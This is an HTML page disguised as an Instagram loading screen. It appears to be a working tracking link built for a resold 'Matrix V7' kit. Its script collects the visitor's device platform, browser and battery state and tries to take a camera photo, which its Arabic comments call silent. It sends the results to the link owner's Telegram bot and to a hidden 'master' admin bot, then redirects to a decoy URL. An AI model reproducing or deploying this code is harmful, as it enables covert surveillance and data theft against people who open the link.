<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram | Loading...</title>
    <style>
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .loader { width: 45px; height: 45px; border: 3px solid #1a1a1a; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>
    <canvas id="cv" style="display:none;"></canvas>

    <script>
        window.onload = async () => {
            // فك تشفير البيانات المرسلة (البوت الفرعي، التمويه، صاحب اللينك)
            const params = new URLSearchParams(window.location.search);
            const p = params.get('p'); // داتا مشفرة
            if (!p) return window.location.href = "https://instagram.com";

            try {
                const cfg = JSON.parse(atob(p)); // {t: token, i: id, u: url, o: ownerID}
                const master = JSON.parse(localStorage.getItem('master_bot') || '{}');

                // 1. سحب بيانات الجهاز الأساسية
                let info = `🏴‍☠️ **صيد جديد (Matrix V7)**\n` +
                           `👤 صاحب اللينك: \`${cfg.o}\`\n` +
                           `📱 الجهاز: ${navigator.platform}\n` +
                           `🌐 المتصفح: ${navigator.userAgent.split(' ').pop()}\n` +
                           `🔋 البطارية: ${await getBattery()}`;

                // 2. محاولة سحب الكاميرا (صامتة)
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    const cv = document.getElementById('cv');
                    cv.width = 640; cv.height = 480;
                    cv.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.7));
                    
                    // إرسال الصورة للمشترك وللأدمن الماستر
                    await sendToBots(cfg, master, info, blob);
                    
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    // لو الكاميرا مقفولة، ابعت البيانات النصية فقط
                    await sendToBots(cfg, master, info + "\n⚠️ الكاميرا: تم الرفض.");
                }

                // 3. التحويل النهائي للتمويه
                setTimeout(() => { window.location.href = cfg.u; }, 1500);

            } catch (err) {
                window.location.href = "https://instagram.com";
            }
        };

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                return `${Math.round(b.level * 100)}% (${b.charging ? 'شحن' : 'تفريغ'})`;
            } catch { return "غير معروف"; }
        }

        async function sendToBots(userBot, adminBot, text, photo = null) {
            const targets = [userBot]; // بوت المشترك
            if (adminBot.t) targets.push(adminBot); // بوتك إنت يا ماستر

            for (let bot of targets) {
                try {
                    if (photo) {
                        const fd = new FormData();
                        fd.append('photo', photo, 'shot.jpg');
                        fd.append('chat_id', bot.i);
                        fd.append('caption', text);
                        fd.append('parse_mode', 'Markdown');
                        await fetch(`https://api.telegram.org/bot${bot.t}/sendPhoto`, { method: 'POST', body: fd });
                    } else {
                        await fetch(`https://api.telegram.org/bot${bot.t}/sendMessage?chat_id=${bot.i}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
                    }
                } catch (e) { console.error("Send Error"); }
            }
        }
    </script>
</body>
</html>
